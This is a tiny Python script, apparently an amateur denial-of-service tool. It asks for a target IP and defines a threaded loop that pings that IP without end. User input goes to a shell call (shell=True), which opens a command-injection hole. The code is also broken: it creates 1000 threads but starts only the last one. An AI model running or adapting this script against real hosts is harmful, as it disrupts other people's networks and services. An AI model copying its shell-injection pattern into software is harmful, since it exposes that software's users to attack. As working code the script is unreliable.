import subprocess
import threading 

ip = input("Enter the IP you want to dos: ")

def attack():
  while True:
    sub1 = subprocess.run(["ping", ip], capture_output=True, shell=True)
    p = sub1.stdout.decode()



for x in range(1000):
  t = threading.Thread(target=attack)

t.start()


